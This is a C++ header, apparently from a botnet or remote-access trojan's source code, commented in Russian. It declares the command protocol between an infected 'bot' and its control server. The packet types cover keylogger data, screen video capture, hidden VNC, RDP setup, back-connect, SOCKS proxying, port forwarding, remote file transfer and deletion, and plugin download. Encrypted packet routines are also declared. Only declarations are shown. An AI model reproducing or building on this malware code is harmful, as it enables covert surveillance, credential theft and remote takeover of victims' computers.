#pragma once

#include <limits.h>
#include "core\core.h"
#include "core\socket.h"
#include "core\PipeSocket.h"
#include "lzw.h"
#include "https.h"

namespace WndRec
{

//иды пакетов
const int ID_VIDEO = 1;
const int ID_FILE_ADD = 2;
const int ID_FILE_NEW = 3;
const int ID_SIZE_FILE = 4;
const int ID_VNC_CONNECT = 6;
const int ID_PORT_FORWARD = 7;
const int ID_SET_UID = 8;
const int ID_PING = 9;
const int ID_INFO = 10;
const int ID_BREAK_VIDEO = 16;
const int ID_EXIT = 17; //выход, завершение работы, в передаваемых данных (int - 4 байта) передается параметр: 1 - выход из процесса
const int ID_LOG = 18; //отсылка логов на сервер
const int ID_VIDEO_BEG = 19; //начало или окончание записи видео
const int ID_BOT_WORK = 20; //запрос у сервера выполняет ли бот какие-то дополнительные задачи (например проброс порта)
const int ID_RDP = 21; //полная настройка доступа по RDP
const int ID_VNC = 22; //полная настройка доступа по VNC
const int ID_BC = 23; //запуск back connect
const int ID_DUPL = 24; //дублирование сервера
const int ID_CMD_BOT = 27; //команда боту в виде текстовой строки: cmd arg1 arg2
const int ID_VNCDLL = 28; //полная настройка доступа по VNCDLL
const int ID_SOCKS_ON_OFF = 29; //включить или отключить socks
const int ID_CONNECTED = 30; //бот соединился или разъединился (посылается функциями ConnectToServer или CloseServer)
const int ID_STREAM_RECREATE = 31; //пересоздание потока, используется при перезапуске сервера
const int ID_PLUGIN = 32; //загрузка плагина с сервера
const int ID_PIPE = 33; //отсылка данных pipe каналу

const int ID_FT_DIR = 34; //отсылает список файлов в указанной папке
const int ID_FT_COPY_SB = 35; //копирование файла с сервера на бот
const int ID_FT_COPY_BS = 36; //копирование файла с бота на сервер
const int ID_FT_MKDIR = 37; //создание папки на стороне бота
const int ID_FT_DEL = 38; //удаление файла или папки на стороне бота
const int ID_SET_UID2 = 39; //ид бота в новых версий бота
const int ID_XOR_MASK = 40; //маска для расшифровки-шифровки пакетов
const int ID_HVNC = 41; //полная настройка доступа по HVNC
const int ID_FT_STOPCOPY = 42; //прерывание процесса копирования файла
const int ID_SLEEP = 43; //отключиться на указанное количество минут

const int ID_SOCKS = 51; //данные для прокси 
const int ID_KEYLOGGER = 52; //данные кейлоггера
const int ID_STREAM_CREATE = 53; //создание потока
const int ID_STREAM_DATA = 54; //данные потока
const int ID_STREAM_CLOSE = 55; //закрытие потока
const int ID_PORTFORWARD_ON_OFF = 56; //включить или отключить проброс порта
const int ID_PORTFORWARD = 57; //данные для пробрасываемого порта
const int ID_SENDSTR = 58; //принимает или отправляет строку
const int ID_BC_PORT = 59; //со стороны бота идет коннект для бекконекта

struct SenderBuf
{
	Mem::Data bufHead; //буфер для чтения заголовка пакета
	Mem::Data bufForRead; //буфер для чтения в сокете
	Mem::Data publicKey, aesKey;
	char* bufForLzw; //буфер для сжатия и расжатия данных
	LZWcode* codes;
//	byte mask[64]; //маска для шифрования
//	int c_mask; //длина маски
	byte verPacket; //с какой версией пакетов работаем (зависит от сервера)
	bool rsa; //true - используем rsa шифрование, иначе aes
	int realBytes; //общий размер отосланных данных
	int lzwBytes; //размер данных в сжатом виде
};

//отключает предупреждение на массив нулевого размера
#pragma warning ( disable : 4200 )

//структура строки передаваемой командой ID_SENDSTR
struct StrServer
{
	int id; //ид строки
	int subId; //подид строки
	int c_s; //размер строки
	char s[0]; //строка (в конце 0 обязателен)
};

struct IOServer
{
	int typeIO; //0 - неизвестно, 1 - сокет, 2 - pipe, 3 - https
	int sc;
	union
	{
		PipeSocketClient* pipe;
		HTTPS* https;
	};

	void Init();

	bool ConnectIP( const char* ip, int port );
	bool ConnectPipe( const char* namePipe );
	bool ConnectHttps( const char* ip );

	void Close();
	int Write( Mem::Data& data );
	int Read( Mem::Data& data, int maxRead, int wait );
	bool Connected();
};

bool WritePacket( SenderBuf* sb, int cmd, IOServer& io, void* data, int c_data, uint id = 0 );
//если в *data = -1, то туда ложится адрес буфера откуда надо взять данные, иначе в *data будет
//адрес выделенной памяти, которую потом нужно будет удалить
int ReadPacket( SenderBuf* sb, int& cmd, IOServer& io, void** data, int wait = INT_MAX, uint* id = 0 );

SenderBuf* InitPacketBuf( byte* mask, int c_mask );
void ReleasePacketBuf(SenderBuf*);
void ResetBuf(SenderBuf*);
//создает пакет формата отправляемого на сервер, необходимо для передачи данных сторонними приложениями
//возвращает сформированный пакет, который можно слать напрямую серверу, размер пакета будет в c_packet
//begSize - сколько памяти выделить перед началом пакета, эту память потом заполняет вызывающая функция своими данными
void* CreateRawPacket( int begSize, int cmd, const void* data, int c_data, int& c_packet );

bool EncryptRSA( const Mem::Data& key, Mem::Data& data );
bool EncryptAES256( const Mem::Data& key, Mem::Data& data );
bool DecryptAES256( const Mem::Data& key, Mem::Data& data, int offset );
bool GenAES256Key( Mem::Data& key );


}
